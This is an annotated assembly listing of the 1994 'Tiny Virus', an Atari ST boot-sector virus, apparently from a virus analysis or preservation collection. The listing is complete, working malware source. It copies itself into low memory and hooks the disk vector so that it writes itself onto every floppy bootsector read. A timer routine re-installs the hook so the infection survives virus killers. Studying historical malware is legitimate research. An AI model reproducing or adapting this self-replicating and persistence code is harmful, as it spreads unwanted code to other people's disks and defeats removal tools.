; Tiny Virus
; Known names: Tiny Virus 
; Symptoms: replicates iself
; Replication: on A only, when Getbpb() is called, on any bootsector
; Resident address: 1C0
; Bootcode size: 192 bytes 
; Bootcode start: 0x1E
; Stealth location: N/A
; Attached vectors: hdv_bpb and vbl_list
; Reset resistance: No
; TOS compatible: All
;
; What's special? 
; - was written in 1994 by Lucky Lady (who wrote and released UVD, where it is available)
; - sets a protection mechanism, every ~100s (5376 VBLs), re-set the hdv_bpb vector (if it was removed by an virus killer for example)
; - relatively small but only provides the replication mechanism with few checks and the proection VBL-routine
; - at bootcode location (and branch), there is a 0.l then the code starts. It seems ok for the TOS.

; ----------------------------------------------------------------------------------------------------------
; Registers
; ----------------------------------------------------------------------------------------------------------
DISKBUFP                    equ $4C6
HDV_BPB                     equ $472                ; long |Vector for getbpb for hard disk                                          |hdv_bpb
VBLCLOCK_LOW                equ $462                ; $000462|long |Counter for number of VBLs                                       |_vbclock
VBL_LIST                    equ $4EA                ; $0004CE-$0004EA|long | This area is used by the system for the initial         |_vbl_list
                                                    ;                       | deferred vertical blank list.  
VBLSEM                      equ $452                ; $000452|word |If not zero, VBL routine is not executed                         |vblsem

; ----------------------------------------------------------------------------------------------------------
; Addresses
; ----------------------------------------------------------------------------------------------------------
RAM_LOCATION                equ $1C0
OLD_HDV_BPB_VECTOR          equ $140
HDV_BPB_VECTOR_ADDR         equ RAM_LOCATION+(HDV_BPB_VECTOR-START)            ; $1EE 
VBL_ROUTINE_ADDR            equ RAM_LOCATION+(VBL_ROUTINE-START)               ; $252

; ----------------------------------------------------------------------------------------------------------
; Constants
; ----------------------------------------------------------------------------------------------------------
BOOTSECTOR_BRA              equ $601C
CHECK_DELAY                 equ $1500               ; 5376 VBLs, approx 100s

; Begin:

; DC.B      $60,$1C,$90,'KOBOL' 
; DC.B      $F2,'\',$B3,$00,$02,$02,$01,$00 
; DC.B      $02,'p',$00,$A0,$05,$F9,$05,$00 
; DC.B      $09,$00,$02,$00,$00,$00,$00,$00 
; DC.B      $00,$00 
        org $1E

; ----------------------------------------------------------------------------------------------------------
; Empty long at branch address
; ----------------------------------------------------------------------------------------------------------

        DC.L   0
; ----------------------------------------------------------------------------------------------------------
; START
; ----------------------------------------------------------------------------------------------------------

START:
        MOVEA.W   #RAM_LOCATION,A0                  ; A0 = $1C0 (448)
        LEA       START(PC),A1                    
        MOVE.W    #(END-START),D0                   ; for d0 = 188 to 0 (0xBC)
.copy:
        MOVE.B    (A1)+,(A0)+                       ; copy 189 bytes to RAM_LOCATION (1C0)
        DBF       D0,.copy

        MOVE.L    #0,VBLCLOCK_LOW.L                 ; reset VBL counter            
        MOVE.W    #VBL_ROUTINE_ADDR,VBL_LIST+2      ; set VBL_ROUTINE in VBL_LIST routine 7 low nibble (enough as in lower RAM)    move.l #$12e, $4ec.l vs #$252
        MOVE.W    #1,VBLSEM.L                       ; enable VBL routine
        RTS 

; ----------------------------------------------------------------------------------------------------------
; hdv_bpb vector
; replicate the virus on any boosector at each Getbpb() call
; ----------------------------------------------------------------------------------------------------------
HDV_BPB_VECTOR:
        MOVEA.L   DISKBUFP.L,A1 
        ADDA.L    #$22,A1                           ; advance to bootcode
        MOVEA.W   #RAM_LOCATION,A2
        MOVE.W    #(END-START+$22)-1,D1             ; for d1 = 221 to 0 ($DD)
.copy:
        MOVE.B    (A2)+,(A1)+                       ; copy 222 bytes from virus location to disk buffer
        DBF       D1,.copy

        MOVEA.L   DISKBUFP.L,A1                     ; A1 = diskbuf
        MOVE.W    #BOOTSECTOR_BRA,(A1)              ; Copy branch, funny it branches to 0s...

        MOVE.L    #$FFFF0001,-(sp)                  ; type unchanged | execflag = 1 (executable)
        MOVE.L    #$FFFFFFFF,-(sp)                  ; serial
        MOVE.L    DISKBUFP.L,-(sp)                  ; buffer = DISKBUFP
        MOVE.W    #$12,-(sp)                        ; VOID Protobt( buf, serial, type, execflag ) => create bootsector
        TRAP      #$E                               ; XBIOS
        ADDA.L    #$E,sp                            ; fix the stack

        CLR.L     -(sp)                             ; dec = A | recno = 0
        MOVE.W    #1,-(sp)                          ; count = 1
        MOVE.L    DISKBUFP.L,-(sp)                  ; buf = (DISKBUFP)
        MOVE.L    #$40001,-(sp)                     ; LONG Rwabs( mode, buf, count, recno, dev, lrecno ) | mode = 1 (write)
        TRAP      #$D                               ; BIOS
        ADDA.L    #$E,sp                            ; fix stack
        MOVEA.L   OLD_HDV_BPB_VECTOR.L,A3           ; A3 = OLD_HDV_BPB_VECTOR ($140: free user vector location)
        JMP       (A3)                              ; call old vector

; ----------------------------------------------------------------------------------------------------------
; VBL routine
; Protection mechanism, Used  to set again, in case of, the HDV_BPB vector, every ~100s
; ----------------------------------------------------------------------------------------------------------        
VBL_ROUTINE:                        
        MOVEA.L   #CHECK_DELAY,A1                   ; A1 = CHECK_DELAY (0x1500 =        )
        CMPA.L    VBLCLOCK_LOW.L,A1                 ; if VBLCLOCK_LOW == 5376 (around 100s)
        BNE       .not_yet
        MOVE.L    HDV_BPB.L,OLD_HDV_BPB_VECTOR.L    ; Save old HDV_BPB vector to OLD_HDV_BPB_VECTOR (0x140)
        MOVE.L    #HDV_BPB_VECTOR_ADDR,HDV_BPB.L    ; Set new hdv_pbp vector to HDV_BPB_VECTOR (0x1EE)
.not_yet:
        RTS 

; ----------------------------------------------------------------------------------------------------------
; Data
; ----------------------------------------------------------------------------------------------------------        
        DC.B      'TINY'
END:
